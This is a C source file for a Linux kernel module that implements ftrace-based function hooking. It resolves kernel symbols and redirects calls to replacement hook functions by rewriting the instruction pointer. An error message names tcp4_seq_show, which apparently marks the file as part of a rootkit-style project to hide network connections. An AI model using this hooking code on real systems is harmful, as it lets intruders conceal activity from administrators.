#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/proc_fs.h>
#include <linux/ftrace.h>
#include <linux/trace.h>
#include <linux/seq_file.h>
#include "ftrace_utils.h"

static void notrace ftrace_callback (unsigned long ip, unsigned long parent_ip, 
    struct ftrace_ops *ops, struct pt_regs *regs)
{
    // since the same callback will be used for different hooks, we need a generic way to find out
    // which hook function should be currently called. this is done with 'container_of', a macro
    // that gets a pointer to a member of a struct, and returns a pointer to matching struct.
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->hook_func;
}

int undo_ftrace_hook(struct ftrace_hook* hook){
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, *((unsigned long*) hook->orig_func_pointer), true, false);
    
    return 0;
}

int set_ftrace_hook(char* name, struct ftrace_hook* hook)
{
    int res;
    
    // set ops fields
    hook->ops.func = ftrace_callback;

    // FTRACE_OPS_FL_SAVE_REGS -    makes the callback regs pointer to point on the actuall reg values. 
    //                              this is needed if we wish to read/modify the reg values.
    // FTRACE_OPS_FL_IPMODIFY -     makes the regs->ip modifiable, so we can override the return address from the ftrace
    //                              callback with our hook function address.
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_IPMODIFY;

    *((unsigned long*) hook->orig_func_pointer) = (unsigned long)kallsyms_lookup_name(name);
    if(!*((unsigned long*) hook->orig_func_pointer)){
        printk("unable to find tcp4_seq_show");
        return -1;
    }

    res = ftrace_set_filter_ip(&hook->ops, *((unsigned long*) hook->orig_func_pointer), false, false);
    if (res != 0){
        printk("failed to set filter ip");
        return res;
    }

    res = register_ftrace_function(&hook->ops);
    if (res != 0){
        printk("failed to register ftrace");
        ftrace_set_filter_ip(&hook->ops,  *((unsigned long*) hook->orig_func_pointer), true, false);
        return res;
    }
    return 0;
}

